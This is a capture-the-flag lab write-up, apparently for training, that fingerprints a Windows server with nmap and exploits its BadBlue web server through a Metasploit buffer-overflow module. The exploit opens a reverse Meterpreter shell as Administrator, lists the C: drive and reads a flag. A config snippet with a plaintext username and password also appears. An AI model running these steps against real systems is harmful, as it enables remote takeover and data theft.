# Windows: Easy File Sharing Server

## Mision

Kali GUI machine and a target machine running a vulnerable easy file sharing server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

Objective: Exploit the application and retrieve the flag!

## Instructions:

Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
The IP address of the target machine is mentioned in the file “/root/Desktop/target”
Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Notes

- **Target IP Address:** 10.4.19.179
- **eth1:** 10.0.0.5
- Microsoft file sharing SMB: User Datagram Protocol (UDP) ports from 135 through 139 and Transmission Control Protocol (TCP) ports from 135 through 139. Direct-hosted SMB traffic without a network basic input/output system (NetBIOS): port 445 (TCP and UPD).

## nmap (sudo nmap -p- -vv -T4 -sC -sV 10.4.19.179)

    root@attackdefense:~# sudo nmap -p- -vv -T4 -sC -sV 10.4.19.179
   
    Discovered open port 139/tcp on 10.4.19.179
    Discovered open port 80/tcp on 10.4.19.179
    Discovered open port 3389/tcp on 10.4.19.179
    Discovered open port 445/tcp on 10.4.19.179
    Discovered open port 135/tcp on 10.4.19.179
    Discovered open port 49162/tcp on 10.4.19.179
    Discovered open port 47001/tcp on 10.4.19.179
    Discovered open port 49155/tcp on 10.4.19.179
    Discovered open port 5985/tcp on 10.4.19.179
    Discovered open port 49154/tcp on 10.4.19.179
    Discovered open port 49152/tcp on 10.4.19.179
    Discovered open port 49164/tcp on 10.4.19.179
    Discovered open port 49153/tcp on 10.4.19.179
    
    Host is up, received timestamp-reply ttl 125 (0.0094s latency).
    Scanned at 2022-04-05 07:35:18 IST for 376s
    PORT      STATE SERVICE            REASON          VERSION
    80/tcp    open  http               syn-ack ttl 125 BadBlue httpd 2.7
    | http-methods: 
    |_  Supported Methods: HEAD
    135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
    | ssl-cert: Subject: commonName=WIN-OMCNBKR66MN
    | Issuer: commonName=WIN-OMCNBKR66MN
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-04-04T01:59:24
    | Not valid after:  2022-10-04T01:59:24
    | MD5:   c576 b09d 3c24 26bb 1c68 6875 1342 e8d1
    | SHA-1: 9f6a 9598 368e ea6c ad28 2b0b 9b0b 3ce2 2d51 2e31
    | -----BEGIN CERTIFICATE-----
    | MIIC4jCCAcqgAwIBAgIQQ9DUVdWNybdB2e3EcXjgWTANBgkqhkiG9w0BAQsFADAa
    | MRgwFgYDVQQDEw9XSU4tT01DTkJLUjY2TU4wHhcNMjIwNDA0MDE1OTI0WhcNMjIx
    | MDA0MDE1OTI0WjAaMRgwFgYDVQQDEw9XSU4tT01DTkJLUjY2TU4wggEiMA0GCSqG
    | SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDLBmXZHO1t8bkc+4GKoJKilb9kMm7vO3CT
    | RnmlGCujUSkj23r0shVsKJ5aMaLS1BN2HIkUf2DoHLB+9S7JcfXx6yGHDndpn0n1
    | Lm/DH7lgpIfCzcbwtjmRwxnfRSeZciV5kyoW/l2gGcTD4DMNtIaU9fEL/lM3G3GY
    | L1kly4/InGRlVavYkTKJVWPA8xLN1oMdYVpCN8FZJgGTFQfOgviNtkgpfMJvQoZ4
    | yXx2hS4V6PTKUKOd3f+cXVMgXNuW4XKxRK7JbDvJMZSDq1trSX0Osf0pZ0HWR47X
    | zxYP9auyAwsj1dkuhnPBp1je+VSEnOOM4AXIw/GciM4FRbzWEj5RAgMBAAGjJDAi
    | MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
    | AAOCAQEANwsZPTyrLElncRBOpALdS5AwDbQSF89xRFp6thKC+x7JeO2WMJRpUNJv
    | pwVEQAkvvkBFwg3RKTDdTC6XHzZw1dBpQBgmx0Sfpl9cmqDHLQ9qtCwrk7cXwND8
    | tQNJDz6AY9T2b37M3HS9k8W5Jfn6qMg9oI0nDYL/vxW+yR3lQ1mdqBWMRT8+roaD
    | WnejQGErNJtjN9iYMn+Hxoa0DrJSiL/DaUhERgQhqmuW8kocUrYCkjE4qQbTi7Ze
    | 8NVyqKYRuc+aeCi5AebyAD9S+ozSWeDex/dYR4ag3W2O4KmiDdu3qnkAJ/XoHuAu
    | YQNS53CqXlH4o9T39V1h04KqE8Z6/A==
    |_-----END CERTIFICATE-----
    5985/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    47001/tcp open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49162/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49164/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 0s, deviation: 0s, median: 0s
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 3580/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 45793/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 47903/udp): CLEAN (Timeout)
    |   Check 4 (port 29415/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb-security-mode: 
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2022-04-05 07:41:27
    |_  start_date: 2022-04-05 07:29:22


## MSFCONSOLE windows/http/badblue_passthru

    msf5 exploit(windows/http/badblue_passthru) > info

        Name: BadBlue 2.72b PassThru Buffer Overflow
        Module: exploit/windows/http/badblue_passthru
    Platform: Windows
        Arch: 
    Privileged: Yes
        License: Metasploit Framework License (BSD)
        Rank: Great
    Disclosed: 2007-12-10

    Provided by:
    MC <mc@metasploit.com>

    Available targets:
    Id  Name
    --  ----
    0   BadBlue EE 2.7 Universal
    1   BadBlue 2.72b Universal

    Check supported:
    No

    Basic options:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS   10.4.19.179      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT    80               yes       The target port (TCP)
    SSL      false            no        Negotiate SSL/TLS for outgoing connections
    VHOST                     no        HTTP server virtual host

    Payload information:
    Space: 750
    Avoid: 15 characters

    Description:
    This module exploits a stack buffer overflow in the PassThru 
    functionality in ext.dll in BadBlue 2.72b and earlier.

    References:
    https://cvedetails.com/cve/CVE-2007-6377/
    OSVDB (42416)
    http://www.securityfocus.com/bid/26803

## MSFCONSOLE Exploit

    msf5 exploit(windows/http/badblue_passthru) > exploit

    [*] Started reverse TCP handler on 10.10.0.5:4444 
    [*] Trying target BadBlue EE 2.7 Universal...
    [*] Sending stage (180291 bytes) to 10.4.19.179
    [*] Meterpreter session 1 opened (10.10.0.5:4444 -> 10.4.19.179:49240) at 2022-04-05 07:47:22 +0530

    meterpreter > getuid
    Server username: WIN-OMCNBKR66MN\Administrator

## Treasure

    [SECURITY_NT]
    groupdomain=domainname
    logonasuser=fred
    logonaspassword=secret

    Meterpreter > dir
    Listing: C:\
    ============

    Mode                 Size                Type  Last modified                    Name
    ----                 ----                ----  -------------                    ----
    40777/rwxrwxrwx      0                   dir   2020-08-12 09:43:47 +0530        $Recycle.Bin
    100666/rw-rw-rw-     1                   fil   2013-08-22 21:16:48 +0530        BOOTNXT
    40777/rwxrwxrwx      0                   dir   2013-08-22 20:18:41 +0530        Documents and Settings
    40777/rwxrwxrwx      0                   dir   2013-08-22 21:09:30 +0530        PerfLogs
    40555/r-xr-xr-x      4096                dir   2013-08-22 19:06:16 +0530        Program Files
    40777/rwxrwxrwx      4096                dir   2013-08-22 19:06:16 +0530        Program Files (x86)
    40777/rwxrwxrwx      4096                dir   2013-08-22 19:06:16 +0530        ProgramData
    40777/rwxrwxrwx      0                   dir   2020-09-05 09:16:25 +0530        System Volume Information
    40555/r-xr-xr-x      4096                dir   2013-08-22 19:06:16 +0530        Users
    40777/rwxrwxrwx      24576               dir   2013-08-22 19:06:16 +0530        Windows
    100444/r--r--r--     398356              fil   2013-08-22 21:16:48 +0530        bootmgr
    100666/rw-rw-rw-     32                  fil   2020-09-16 14:31:09 +0530        flag.txt
    356011620/rw--w----  296952234959208431  fif   9419046029-08-22 23:01:44 +0530  pagefile.sys

    meterpreter > cat flag.txt
    `70a569da306697d64fc6c19afea37d94`
